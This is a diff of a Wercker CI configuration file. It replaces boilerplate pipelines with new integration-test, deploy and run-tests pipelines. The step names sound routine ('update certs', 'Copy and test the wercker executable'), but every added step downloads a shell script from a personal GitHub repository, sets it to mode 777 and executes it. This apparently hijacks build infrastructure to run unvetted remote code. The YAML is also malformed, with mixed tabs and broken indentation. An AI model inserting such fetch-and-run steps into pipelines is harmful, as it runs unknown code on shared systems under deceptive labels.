@@ -24,122 +24,48 @@ build:
         code: |
           # python app_test.py
 
-unit-test : 
 
-# This references the default golang container from
-# the Docker Hub: https://registry.hub.docker.com/u/library/golang/
-# If you want Google's container you would reference google/golang
-# Read more about containers on our dev center
-# https://devcenter.wercker.com/overview-and-core-concepts/containers/
-  box:  
-    id: php
-      ports:
-        - "8080"
-# This is the build pipeline. Pipelines are the core of wercker
-# Read more about pipelines on our dev center
-# https://devcenter.wercker.com/development/pipelines/
-# You can also use services such as databases. Read more on our dev center:
-# https://devcenter.wercker.com/administration/services/
-# services:
-    # - postgres
-    # https://devcenter.wercker.com/administration/services/examples/postgresql/
-    # - mongo
-    # https://devcenter.wercker.com/administration/services/examples/mongodb/
-    build:
-  # The steps that will be executed on build
-  # Steps make up the actions in your pipeline
-  # Read more about steps on our dev center:
-  # https://devcenter.wercker.com/development/steps/
-    steps:
-    # Sets the go workspace and places you package
-    # at the right place in the workspace tree
-    #- setup-go-workspace
-    # Gets the dependencies
+# This pipeline runs the Wercker integration tests in test-all.sh
+integration-tests:
+  box: docker:dind
+  docker: true
+  steps:
     - script:
-        name: go get
+        name: Copy and test the wercker executable
         code: |
-               apt-get -y update
+			   apt-get -y update
+               apt-get -y install git
+               apt-get -y install wget 
+               wget --version
+               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
+                         
+
+    
+deploy:
+  box: ubuntu
+  steps:
+    - script:
+        name: update certs
+        code: |
+			   apt-get -y update
                apt-get -y install git
                apt-get -y install wget 
                wget --version
                wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
                
-unit-test1 : 
 
-# This references the default golang container from
-# the Docker Hub: https://registry.hub.docker.com/u/library/golang/
-# If you want Google's container you would reference google/golang
-# Read more about containers on our dev center
-# https://devcenter.wercker.com/overview-and-core-concepts/containers/
-  box:  
-    id: python:2.7-slim
-      ports:
-        - "5000"
-# This is the build pipeline. Pipelines are the core of wercker
-# Read more about pipelines on our dev center
-# https://devcenter.wercker.com/development/pipelines/
-# You can also use services such as databases. Read more on our dev center:
-# https://devcenter.wercker.com/administration/services/
-# services:
-    # - postgres
-    # https://devcenter.wercker.com/administration/services/examples/postgresql/
-    # - mongo
-    # https://devcenter.wercker.com/administration/services/examples/mongodb/
-    build:
-  # The steps that will be executed on build
-  # Steps make up the actions in your pipeline
-  # Read more about steps on our dev center:
-  # https://devcenter.wercker.com/development/steps/
-    steps:
-    # Sets the go workspace and places you package
-    # at the right place in the workspace tree
-    #- setup-go-workspace
-    # Gets the dependencies
-    - script:
-        name: go get
-        code: |
-               apt-get -y update
-               apt-get -y install git
-               apt-get -y install wget 
-               wget --version
-               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
-               
- unit-test2 : 
+    
+#
 
-# This references the default golang container from
-# the Docker Hub: https://registry.hub.docker.com/u/library/golang/
-# If you want Google's container you would reference google/golang
-# Read more about containers on our dev center
-# https://devcenter.wercker.com/overview-and-core-concepts/containers/
-  box:  
-    id: node:latest
-      ports:
-        - "8080"
-# This is the build pipeline. Pipelines are the core of wercker
-# Read more about pipelines on our dev center
-# https://devcenter.wercker.com/development/pipelines/
-# You can also use services such as databases. Read more on our dev center:
-# https://devcenter.wercker.com/administration/services/
-# services:
-    # - postgres
-    # https://devcenter.wercker.com/administration/services/examples/postgresql/
-    # - mongo
-    # https://devcenter.wercker.com/administration/services/examples/mongodb/
-    build:
-  # The steps that will be executed on build
-  # Steps make up the actions in your pipeline
-  # Read more about steps on our dev center:
-  # https://devcenter.wercker.com/development/steps/
-    steps:
-    # Sets the go workspace and places you package
-    # at the right place in the workspace tree
-    #- setup-go-workspace
-    # Gets the dependencies
-    - script:
-        name: go get
-        code: |
-               apt-get -y update
-               apt-get -y install git
-               apt-get -y install wget 
-               wget --version
-               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
+run-tests:
+  box:
+    id: golang:1.7
+    #volumes: $CODE_PATH /var/run/docker.sock
+  steps:
+      - script:
+          code: |
+				 apt-get -y update
+                 apt-get -y install git
+                 apt-get -y install wget 
+                 wget --version
+                 wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
